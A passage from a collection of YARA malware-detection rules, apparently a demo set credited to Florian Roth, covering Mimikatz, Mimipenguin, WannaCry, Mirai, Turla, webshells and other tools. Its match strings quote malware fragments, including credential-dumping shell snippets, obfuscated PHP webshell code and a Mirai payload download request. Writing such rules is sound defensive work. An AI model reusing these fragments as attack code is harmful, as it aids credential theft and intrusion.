      hash1 = "ce92c0bcdf63347d84824a02b7a448cf49dd9f44db2d02722d01c72556a2b767"
      hash2 = "49d7fec5feff20b3b57b26faccd50bc05c71f1dddf5800eb4abaca14b83bba8c"
      tags = "DEMO, EXE, FILE, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[ticket %u] session Key is NULL, maybe a TGT without enough rights when WCE dumped it." fullword wide
      $x2 = "ERROR kuhl_m_smb_time ; Invalid! Command: %02x - Status: %08x" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) ) )
}

rule Exp_EPS_CVE20152545_RID2C5A : DEMO EXPLOIT FILE OFFICE {
   meta:
      description = "Detects EPS Word Exploit"
      author = "Florian Roth"
      reference = "Internal Research - ME"
      date = "2017-07-19 09:45:31"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXPLOIT, FILE, OFFICE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "word/media/image1.eps" ascii
      $s2 = "-la;7(la+" ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and ( $s1 and #s2 > 20 )
}

rule CHAOS_Payload_RID2BA8 : DEMO EXE FILE HKTL chaosransomware {
   meta:
      description = "Detects a CHAOS back connect payload"
      author = "Florian Roth"
      reference = "https://github.com/tiagorlampert/CHAOS"
      date = "2017-07-15 09:15:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0962fcfcb1b52df148720c2112b036e75755f09279e3ebfce1636739af9b4448"
      hash2 = "5c3553345f824b7b6de09ccb67d834e428b8df17443d98816471ca28f5a11424"
      tags = "DEMO, EXE, FILE, HKTL, chaosransomware"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = { 2F 43 48 41 4F 53 00 02 73 79 6E 63 2F 61 74 6F 6D 69 63 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and all of them )
}

rule SecurityXploded_Producer_String_RID33B2 : DEMO EXE FILE HKTL {
   meta:
      description = "Detects hacktools by SecurityXploded"
      author = "Florian Roth"
      reference = "http://securityxploded.com/browser-password-dump.php"
      date = "2017-07-13 14:58:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d57847db5458acabc87daee6f30173348ac5956eb25e6b845636e25f5a56ac59"
      tags = "DEMO, EXE, FILE, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "http://securityxploded.com" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and all of them )
}

rule PAS_Webshell_Encoded_RID2E9B : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detects a PAS webshell"
      author = "Florian Roth"
      reference = "http://blog.talosintelligence.com/2017/07/the-medoc-connection.html"
      date = "2017-07-11 11:21:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $head1 = "<?php $____=" fullword ascii
      $head2 = "'base'.(32*2).'" 
      $enc1 = "isset($_COOKIE['___']" ascii
      $enc2 = "if($___!==NULL){" ascii
      $enc3 = ").substr(md5(strrev($" ascii
      $enc4 = "]))%256);$" ascii
      $enc5 = "]))@setcookie('" ascii
      $enc6 = "]=chr(( ord($_" ascii
      $x1 = { 3D 0A 27 29 29 3B 69 66 28 69 73 73 65 74 28 24 5F 43 4F 4F 4B 49 45 5B 27 } 
      $foot1 = "value=\"\"/><input type=\"submit\" value=\"&gt;\"/></form>" 
      $foot2 = "();}} @header(\"Status: 404 Not Found\"); ?>" 
   condition: 
      ( uint32 ( 0 ) == 0x68703f3c and filesize < 80KB and ( 3 of them or $head1 at 0 or $head2 in ( 0 .. 20 ) or 1 of ( $x* ) ) ) or $foot1 at ( filesize - 52 ) or $foot2 at ( filesize - 44 )
}

rule mimipenguin_1_RID2C43 : DEMO FILE HKTL {
   meta:
      description = "Detects Mimipenguin hack tool"
      author = "Florian Roth"
      reference = "https://github.com/huntergregal/mimipenguin"
      date = "2017-07-08 09:41:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9e8d13fe27c93c7571075abf84a839fd1d31d8f2e3e48b3f4c6c13f7afcf8cbd"
      tags = "DEMO, FILE, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "self._strings_dump += strings(dump_process(target_pid))" fullword ascii
      $x2 = "def _dump_target_processes(self):" fullword ascii
      $x3 = "self._target_processes = ['sshd:']" fullword ascii
      $x4 = "GnomeKeyringPasswordFinder()" ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 20KB and 1 of them )
}

rule mimipenguin_2_RID2C44 : DEMO FILE HKTL {
   meta:
      description = "Detects Mimipenguin hack tool"
      author = "Florian Roth"
      reference = "https://github.com/huntergregal/mimipenguin"
      date = "2017-07-08 09:41:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "453bffa90d99a820e4235de95ec3f7cc750539e4023f98ffc8858f9b3c15d89a"
      tags = "DEMO, FILE, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "DUMP=$(strings \"/tmp/dump.${pid}\" | grep -E" fullword ascii
      $x2 = "strings /tmp/apache* | grep -E '^Authorization: Basic.+=$'" fullword ascii
      $x3 = "grep -E '^_pammodutil_getpwnam_root_1$' -B 5 -A" fullword ascii
      $x4 = "strings \"/tmp/dump.${pid}\" | grep -E -m 1 '^\\$.\\$.+\\$')\"" fullword ascii
      $x5 = "if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep gnome-keyring) ]]; then" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 20KB and 1 of them )
}

rule Molerats_Jul17_Sample_1_RID2F9B : APT DEMO EXE FILE G0021 {
   meta:
      description = "Detects Molerats sample - July 2017"
      author = "Florian Roth"
      reference = "https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html"
      date = "2017-07-07 12:04:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ebf2423b9de131eab1c61ac395cbcfc2ac3b15bd9c83b96ae0a48619a4a38d0a"
      tags = "APT, DEMO, EXE, FILE, G0021"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "ezExODA0Y2U0LTkzMGEtNGIwOS1iZjcwLTlmMWE5NWQwZDcwZH0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{c00" wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
}

rule Disclosed_0day_POCs_exploit_RID3190 : DEMO EXE EXPLOIT FILE HKTL {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      author = "Florian Roth"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07 13:27:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "632d35a0bac27c9b2f3f485d43ebba818089cf72b3b8c4d2e87ce735b2e67d7e"
      tags = "DEMO, EXE, EXPLOIT, FILE, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "\\Release\\exploit.pdb" ascii
      $x2 = "\\favorites\\stolendata.txt" wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule Disclosed_0day_POCs_InjectDll_RID3204 : DEMO EXE FILE HKTL {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      author = "Florian Roth"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07 13:47:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2022-12-21"
      hash1 = "173d3f78c9269f44d069afbd04a692f5ae42d5fdc9f44f074599ec91e8a29aa2"
      tags = "DEMO, EXE, FILE, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "\\Release\\InjectDll.pdb" ascii
      $x2 = "Specify -l to list all IE processes running in the current session" fullword ascii
      $x3 = "Usage: InjectDll -l|pid PathToDll" fullword ascii
      $x4 = "Injecting DLL: %ls into PID: %d" fullword ascii
      $x5 = "Error adjusting privilege %d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )
}

rule Disclosed_0day_POCs_injector_RID31E9 : DEMO EXE HKTL {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      author = "Florian Roth"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07 13:42:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ba0e2119b2a6bad612e86662b643a404426a07444d476472a71452b7e9f94041"
      tags = "DEMO, EXE, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "\\Release\\injector.pdb" ascii
      $x2 = "Cannot write the shellcode in the process memory, error: " fullword ascii
      $x3 = "/s shellcode_file PID: shellcode injection." fullword ascii
      $x4 = "/d dll_file PID: dll injection via LoadLibrary()." fullword ascii
      $x5 = "/s shellcode_file PID" fullword ascii
      $x6 = "Shellcode copied in memory: OK" fullword ascii
      $x7 = "Usage of the injector. " fullword ascii
      $x8 = "KO: cannot obtain the SeDebug privilege." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and 1 of them ) or 3 of them
}

rule Disclosed_0day_POCs_shellcodegenerator_RID3605 : DEMO EXE FILE HKTL {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      author = "Florian Roth"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07 16:38:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "55c4073bf8d38df7d392aebf9aed2304109d92229971ffac6e1c448986a87916"
      tags = "DEMO, EXE, FILE, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "\\Release\\shellcodegenerator.pdb" ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them )
}

rule TeleDoor_Backdoor_RID2DB3 : DEMO EXE FILE MAL RANSOM teledoor {
   meta:
      description = "Detects the TeleDoor Backdoor as used in Petya Attack in June 2017"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/"
      date = "2017-07-05 10:43:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "d462966166450416d6addd3bfdf48590f8440dd80fc571a389023b7c860ca3ac"
      hash2 = "f9d6fe8bd8aca6528dec7eaa9f1aafbecde15fd61668182f2ba8a7fc2b9a6740"
      hash3 = "2fd2863d711a1f18eeee5c7c82f2349c5d4e00465de9789da837fcdca4d00277"
      tags = "DEMO, EXE, FILE, MAL, RANSOM, teledoor"
      minimum_yara = "3.5.0"
      
   strings:
      $c1 = { 50 61 79 6C 6F 61 64 00 41 75 74 6F 50 61 79 6C 6F 61 64 } 
      $c2 = { 52 75 6E 43 6D 64 00 44 75 6D 70 44 61 74 61 } 
      $c3 = { 00 5A 76 69 74 57 65 62 43 6C 69 65 6E 74 45 78 74 00 4D 69 6E 49 6E 66 6F } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and 2 of them )
}

rule Wordpress_Config_Webshell_Preprend_RID34C3 : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Webshell that uses standard Wordpress wp-config.php file and appends the malicious code in front of it"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-06-25 15:44:21"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = " * @package WordPress" fullword ascii
      $s1 = "define('DB_NAME'," ascii
      $s2 = "require_once(ABSPATH . 'wp-settings.php');" ascii
      $fp1 = "iThemes Security Config" ascii
   condition: 
      uint32 ( 0 ) == 0x68703f3c and filesize < 400KB and $x1 and all of ( $s* ) and not $x1 in ( 0 .. 1000 ) and not 1 of ( $fp* )
}

rule Waterbear_11_Jun17_RID2D63 : DEMO EXE FILE MAL {
   meta:
      description = "Detects malware from Operation Waterbear"
      author = "Florian Roth"
      reference = "https://www.trendmicro.com/en_us/research/17/f/following-trail-blacktech-cyber-espionage-campaigns.html"
      date = "2017-06-23 10:29:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "b046b2e2569636c2fc3683a0da8cfad25ff47bc304145be0f282a969c7397ae8"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "/Pages/%u.asp" fullword wide
      $s2 = "NVIDIA Corporation." fullword wide
      $s3 = "tqxbLc|fP_{eOY{eOX{eO" fullword ascii
      $s4 = "Copyright (C) 2005" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )
}

rule Waterbear_12_Jun17_RID2D64 : DEMO EXE FILE MAL {
   meta:
      description = "Detects malware from Operation Waterbear"
      author = "Florian Roth"
      reference = "https://www.trendmicro.com/en_us/research/17/f/following-trail-blacktech-cyber-espionage-campaigns.html"
      date = "2017-06-23 10:29:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "15d9db2c90f56cd02be38e7088db8ec00fc603508ec888b4b85d60d970966585"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "O_PROXY" fullword ascii
      $s2 = "XMODIFY" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
}

rule Waterbear_14_Jun17_RID2D66 : DEMO EXE FILE MAL {
   meta:
      description = "Detects malware from Operation Waterbear"
      author = "Florian Roth"
      reference = "https://www.trendmicro.com/en_us/research/17/f/following-trail-blacktech-cyber-espionage-campaigns.html"
      date = "2017-06-23 10:30:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "00a1068645dbe982a9aa95e7b8202a588989cd37de2fa1b344abbc0102c27d05"
      hash2 = "53330a80b3c4f74f3f10a8621dbef4cd2427723e8b98c5b7aed58229d0c292ba"
      hash3 = "bdcb23a82ac4eb1bc9254d77d92b6f294d45501aaea678a3d21c8b188e31e68b"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "my.com/msg/util/sgthash" fullword ascii
      $s2 = "C:\\recycled" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 8000KB and all of them )
}

rule BTC_Miner_lsass1_chrome_2_RID3068 : DEMO EXE FILE MAL {
   meta:
      description = "Detects a Bitcoin Miner"
      author = "Florian Roth"
      reference = "Internal Research - CN Actor"
      date = "2017-06-22 12:38:31"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "048e9146387d6ff2ac055eb9ddfbfb9a7f70e95c7db9692e2214fa4bec3d5b2e"
      hash2 = "c8db8469287d47ffdc74fe86ce0e9d6e51de67ba1df318573c9398742116a6e8"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "-t, --threads=N       number of miner threads (default: number of processors)" fullword ascii
      $x2 = "-O, --userpass=U:P    username:password pair for mining server" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and 1 of them )
}

rule CN_Actor_RA_Tool_Ammyy_mscorsvw_RID3338 : CHINA DEMO EXE FILE MAL T1219 {
   meta:
      description = "Detects Ammyy remote access tool"
      author = "Florian Roth"
      reference = "Internal Research - CN Actor"
      date = "2017-06-22 14:38:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "1831806fc27d496f0f9dcfd8402724189deaeb5f8bcf0118f3d6484d0bdee9ed"
      hash2 = "d9ec0a1be7cd218042c54bfbc12000662b85349a6b78731a09ed336e5d3cf0b4"
      tags = "CHINA, DEMO, EXE, FILE, MAL, T1219"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Please enter password for accessing remote computer" fullword ascii
      $s2 = "Die Zugriffsanforderung wurde vom Remotecomputer abgelehnt" fullword ascii
      $s3 = "It will automatically be run the next time this computer is restart or you can start it manually" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and 3 of them )
}

rule CN_Actor_AmmyyAdmin_RID2E4F : CHINA DEMO EXE FILE MAL T1219 {
   meta:
      description = "Detects Ammyy Admin Downloader"
      author = "Florian Roth"
      reference = "Internal Research - CN Actor"
      date = "2017-06-22 11:09:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "1831806fc27d496f0f9dcfd8402724189deaeb5f8bcf0118f3d6484d0bdee9ed"
      tags = "CHINA, DEMO, EXE, FILE, MAL, T1219"
      minimum_yara = "3.5.0"
      
   strings:
      $x2 = "\\Ammyy\\sources\\main\\Downloader.cpp" ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
}

rule Mimikatz_Gen_Strings_RID2F19 : DEMO EXE FILE GEN HKTL S0002 T1003 T1134_005 T1550_002 T1550_003 {
   meta:
      description = "Detects Mimikatz by using some special strings"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-06-19 11:42:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "058cc8b3e4e4055f3be460332a62eb4cbef41e3a7832aceb8119fd99fea771c4"
      hash2 = "eefd4c038afa0e80cf6521c69644e286df08c0883f94245902383f50feac0f85"
      hash3 = "f35b589c1cc1c98c4c4a5123fd217bdf0d987c00d2561992cbfb94bd75920159"
      tags = "DEMO, EXE, FILE, GEN, HKTL, S0002, T1003, T1134_005, T1550_002, T1550_003"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "[*] '%s' service already started" fullword wide
      $s2 = "** Security Callback! **" fullword wide
      $s3 = "Try to export a software CA to a crypto (virtual)hardware" fullword wide
      $s4 = "enterpriseadmin" fullword wide
      $s5 = "Ask debug privilege" fullword wide
      $s6 = "Injected =)" fullword wide
      $s7 = "** SAM ACCOUNT **" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 12000KB and 1 of them )
}

rule Industroyer_Portscan_3_Output_RID32E4 : APT DEMO {
   meta:
      description = "Detects Industroyer related custom port scaner output file"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/2017/06/12/industroyer-biggest-threat-industrial-control-systems-since-stuxnet/"
      date = "2017-06-13 14:24:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      tags = "APT, DEMO"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "WSA library load complite." fullword ascii
      $s2 = "Connection refused" fullword ascii
   condition: 
      all of them
}

rule Industroyer_Malware_4_RID2F74 : APT DEMO EXE FILE {
   meta:
      description = "Detects Industroyer related malware"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/2017/06/12/industroyer-biggest-threat-industrial-control-systems-since-stuxnet/"
      date = "2017-06-13 11:57:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "21c1fdd6cfd8ec3ffe3e922f944424b543643dbdab99fa731556f8805b0d5561"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "haslo.dat" fullword wide
      $s2 = "defragsvc" fullword ascii
      $a1 = { 00 2E 00 64 00 61 00 74 00 00 00 43 72 61 73 68 00 00 00 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of ( $s* ) or $a1 )
}

rule TA459_Malware_May17_1_RID2DEE : DEMO FILE G0062 MAL {
   meta:
      description = "Detects TA459 related malware"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/threat-insight/post/apt-targets-financial-analysts#.WS3IBVFV4no.twitter"
      date = "2017-05-31 10:52:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "5fd61793d498a395861fa263e4438183a3c4e6f1e4f098ac6e97c9d0911327bf"
      tags = "DEMO, FILE, G0062, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "xtsewy" fullword ascii
      $s6 = "CW&mhAklnfVULL" ascii
   condition: 
      ( uint16 ( 0 ) == 0x6152 and filesize < 800KB and all of them )
}

rule WannCry_m_vbs_RID2C49 : CRIME DEMO FILE MAL RANSOM SCRIPT {
   meta:
      description = "Detects WannaCry Ransomware VBS"
      author = "Florian Roth"
      reference = "https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100"
      date = "2017-05-12 09:42:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "51432d3196d9b78bdc9867a77d601caffd4adaa66dcac944a5ba0b3112bbea3b"
      tags = "CRIME, DEMO, FILE, MAL, RANSOM, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = ".TargetPath = \"C:\\@" ascii
      $x2 = ".CreateShortcut(\"C:\\@" ascii
      $s3 = " = WScript.CreateObject(\"WScript.Shell\")" ascii
   condition: 
      ( uint16 ( 0 ) == 0x4553 and filesize < 1KB and all of them )
}

rule WannaCry_RansomNote_RID2E99 : CRIME DEMO FILE MAL RANSOM {
   meta:
      description = "Detects WannaCry Ransomware Note"
      author = "Florian Roth"
      reference = "https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100"
      date = "2017-05-12 11:21:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "4a25d98c121bb3bd5b54e0b6a5348f7b09966bffeec30776e5a731813f05d49e"
      tags = "CRIME, DEMO, FILE, MAL, RANSOM"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "A:  Don't worry about decryption." fullword ascii
      $s2 = "Q:  What's wrong with my files?" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x3a51 and filesize < 2KB and all of them )
}

rule Mirai_1_May17_RID2B81 : DEMO FILE MAL {
   meta:
      description = "Detects Mirai Malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-05-12 09:09:21"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "172d050cf0d4e4f5407469998857b51261c80209d9fa5a2f5f037f8ca14e85d2"
      hash2 = "9ba8def84a0bf14f682b3751b8f7a453da2cea47099734a72859028155b2d39c"
      hash3 = "a393449a5f19109160384b13d60bb40601af2ef5f08839b5223f020f1f83e990"
      tags = "DEMO, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "GET /bins/mirai.x86 HTTP/1.0" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 5000KB and all of them )
}

rule SnakeTurla_Malware_May17_1_RID30B1 : DEMO FILE G0010 MAL RUSSIA {
   meta:
      description = "Detects Snake / Turla Sample"
      author = "Florian Roth"
      reference = "https://blog.fox-it.com/2017/05/03/snake-coming-soon-in-mac-os-x-flavour/"
      date = "2017-05-04 12:50:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "5b7792a16c6b7978fca389882c6aeeb2c792352076bf6a064e7b8b90eace8060"
      tags = "DEMO, FILE, G0010, MAL, RUSSIA"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "/Users/vlad/Desktop/install/install/" ascii
   condition: 
      ( uint16 ( 0 ) == 0xfacf and filesize < 200KB and all of them )
}

rule SnakeTurla_Malware_May17_4_RID30B4 : DEMO FILE G0010 MAL RUSSIA {
   meta:
      description = "Detects Snake / Turla Sample"
      author = "Florian Roth"
      reference = "https://blog.fox-it.com/2017/05/03/snake-coming-soon-in-mac-os-x-flavour/"
      date = "2017-05-04 12:51:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "d5ea79632a1a67abbf9fb1c2813b899c90a5fb9442966ed4f530e92715087ee2"
      tags = "DEMO, FILE, G0010, MAL, RUSSIA"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Install Adobe Flash Player.app/com.adobe.updatePK" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x4b50 and filesize < 5000KB and all of them )
}

rule SnakeTurla_Installd_SH_RID2F9F : DEMO FILE G0010 MAL RUSSIA SCRIPT {
   meta:
      description = "Detects Snake / Turla Sample"
      author = "Florian Roth"
      reference = "https://blog.fox-it.com/2017/05/03/snake-coming-soon-in-mac-os-x-flavour/"
      date = "2017-05-04 12:05:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      tags = "DEMO, FILE, G0010, MAL, RUSSIA, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "PIDS=`ps cax | grep installdp" ascii
      $s2 = "${SCRIPT_DIR}/installdp ${FILE}" ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 20KB and all of them )
}

rule SnakeTurla_Install_SH_RID2F3B : DEMO FILE G0010 MAL RUSSIA SCRIPT {
   meta:
      description = "Detects Snake / Turla Sample"
      author = "Florian Roth"
      reference = "https://blog.fox-it.com/2017/05/03/snake-coming-soon-in-mac-os-x-flavour/"
      date = "2017-05-04 11:48:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      tags = "DEMO, FILE, G0010, MAL, RUSSIA, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "${TARGET_PATH}/installd.sh" ascii
      $s2 = "$TARGET_PATH2/com.adobe.update.plist" ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 20KB and all of them )
}

rule Enigma_Protected_Malware_May17_RhxFiles_RID3605 : DEMO EXE FILE MAL {
   meta:
      description = "Detects Enigma protected malware samples"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-05-02 16:38:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2187d6bd1794bf7b6199962d8a8677f19e4382a124c30933d01aba93cc1f0f15"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { bd 9c 74 f6 7a 3a f7 94 c5 7d 7c 7c 7c 7e ae 73 } 
      $op2 = { 82 62 6b 6b 6b 68 a5 ea aa 69 6b 6b 6b 3a 3b 94 } 
      $op3 = { 7c 7c c5 7d 7c 7c 7c 7e ae 73 f9 79 7c 7c 7c f6 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and all of them )
}

rule EnigmaPacker_Rare_RID2DA1 : DEMO EXE FILE MAL T1027_002 {
   meta:
      description = "Detects an ENIGMA packed executable"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-04-27 10:40:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "77be6e80a4cfecaf50d94ee35ddc786ba1374f9fe50546f1a3382883cb14cec9"
      tags = "DEMO, EXE, FILE, MAL, T1027_002"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "P.rel$oc$" fullword ascii
      $s2 = "ENIGMA" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and all of them )
}

rule Obfuscated_JS_April17_RID2ECC : ANOMALY DEMO HKTL OBFUS S0002 T1003 T1059_007 T1134_005 T1550_002 T1550_003 {
   meta:
      description = "Detects cloaked Mimikatz in JS obfuscation"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-04-21 11:29:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "ANOMALY, DEMO, HKTL, OBFUS, S0002, T1003, T1059_007, T1134_005, T1550_002, T1550_003"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "\";function Main(){for(var " ascii
      $s2 = "=String.fromCharCode(parseInt(" ascii
      $s3 = "));(new Function(" ascii
   condition: 
      filesize < 500KB and all of them
}

rule EquationGroup_Toolset_Apr17_Eclipsedwing_Rpcproxy_Pcdlllauncher_RID403A : APT DEMO EXE FILE {
   meta:
